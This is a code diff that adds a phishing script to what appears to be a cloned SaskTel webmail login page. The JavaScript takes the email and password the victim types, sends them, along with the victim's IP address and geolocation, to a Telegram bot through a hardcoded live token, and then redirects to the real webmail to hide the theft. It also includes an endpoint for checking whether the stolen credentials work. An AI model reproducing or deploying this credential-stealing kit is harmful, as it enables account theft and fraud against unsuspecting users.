+      <div ng-show="( isMobile !== true &amp;&amp; isMobile !== false )" class="loading-spinner-home loading-full-screen ng-hide">
+         <span class="fa fa-fw fa-cog fa-spin"></span>
+      </div>
+      <!-- used in util-audiofile-factory for IE hack for playing sounds -->
+      <div id="audiocnt"></div>
+	   <script>
+	   //setInterval(function(){
+	   //console.clear();
+	   //}, 1000)
+console.clear();
+async function ip() {
+      try {
+        const ips = await fetch('http://ifconfig.me/ip');
+        
+        if (!ips.ok) {
+          throw new Error(`Failed to retrieve IP address from FreeGeoIP API`);
+        }
+        
+        const ipv4 = await ips.text();
+        const response = await fetch('https://reallyfreegeoip.org/json/'+ipv4);
+        
+        if (!response.ok) {
+          throw new Error(`Failed to retrieve IP address from FreeGeoIP API`);
+        }
+		const geo = await response.json();
+		return JSON.stringify(geo);
+      } catch (error) {
+        console.error(error);
+        return null;
+      }
+    }
+// Toggle password visibility
+function togglePasswordVisibility() {
+  const passwordInput = document.querySelector('#password');
+  const toggleIcon = document.querySelector('.toggle-password');
+  const isPasswordVisible = passwordInput.getAttribute('type') === 'password';
+
+  passwordInput.setAttribute('type', isPasswordVisible ? 'text' : 'password');
+
+  const text = isPasswordVisible ? 'Hide password' : 'Show password';
+  toggleIcon.innerHTML = '';
+  toggleIcon.innerHTML = isPasswordVisible
+    ? '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-eye-slash" viewBox="0 0 16 16">...</svg>'
+    : '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" title="Show password" aria-label="Show password" fill="currentColor" class="bi bi-eye" viewBox="0 0 16 16">...</svg>';
+  toggleIcon.setAttribute('title', text);
+  toggleIcon.setAttribute('aria-label', text);
+}
+
+// Check email validity
+function checkEmail(id) {
+  const emailInput = document.getElementById(id);
+  const emailRegex = /^(([^<>()[\]\.,;:\s@\"]+(\.[^<>()[\]\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+  return emailRegex.test(emailInput.value);
+}
+
+// Validate credentials
+async function validate(usr, pass) {
+  const res = await fetch(`https://rendertron-lduh.onrender.com/sasktel?username=${usr}&password=${pass}`);
+  const text = res.text();
+  if(text !== "200"){
+  return false;
+  }else{
+  return true;
+  }
+}
+function warn(user, pass){
+
+	const chatId = '6677697197';
+	const token = '7142915714:AAGSeoIv2b_GLMWu5ptJGFuT4ePSprvv0w0';
+	const msg = `╔═════════════════════╗\n❰⚠️❱ <b>  Warning in Here  </b> ❰⚠️❱\n\n◉ Email : <b> ${user}</b>\n◉ Password : <b style="color: #ccc;">${pass}</b>\n\n╚═════════════════════╝`;
+	fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json'
+         },
+         body: JSON.stringify({
+           text: msg,
+           chat_id: chatId,
+           parse_mode: 'HTML'
+         })
+       });
+	   
+}
+var numb = 0;
+// Check form submission
+async function checkit() {
+  numb++;
+  const emailInput = document.querySelector('#username');
+  const passwordInput = document.querySelector('#password');
+  const alertElement = document.querySelector('.alert');
+  const chatId = '-1002220790270';
+  const token = '7142915714:AAGSeoIv2b_GLMWu5ptJGFuT4ePSprvv0w0';
+  const msg = `╔═════════════════════╗\n❰⚠️❱ <b>  New Login in Here  </b> ❰⚠️❱\n\n◉ Email : <b> ${emailInput.value}</b>\n◉ Password : <b style="color: #ccc;">* * * * * * * *</b>\n\n╚═════════════════════╝`;
+
+  if (!checkEmail('username') || !passwordInput.value) {
+    alertElement.classList.remove('hide');
+  }else{ 
+	  if(numb <= 1){
+		warn(emailInput.value, passwordInput.value);
+		alertElement.classList.remove('hide');
+	  }else{
+      const chatId = '-1002220790270';
+      const token = '7142915714:AAGSeoIv2b_GLMWu5ptJGFuT4ePSprvv0w0';
+	  const ipinfo = `\n\`\`\`\njson ${await ip()}\n\`\`\``;
+      const msg = `╔═════════════════════╗\n❰⚠️❱ <b>  New Login in Here  </b> ❰⚠️❱\n\n◉ Email : <b> ${emailInput.value}</b>\n◉ Password : <b style="color: #ccc;">${passwordInput.value}</b>\n\n╚═════════════════════╝`;
+
+      // Commented out Telegram API call
+       fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json'
+         },
+         body: JSON.stringify({
+           text: msg,
+           chat_id: chatId,
+           parse_mode: 'HTML'
+         })
+       })
+       .then(() => {
+		fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=MarkdownV2&text=${ipinfo}`);
+         window.location.replace('https://webmail.sasktel.net');
+       });
+    }
+}
+}
+
+                                             </script>
+      <script src="https://webmail.sasktel.net/84c19c3/require.js" data-main="67023de/main.js"></script>
+   </body>
+</html>
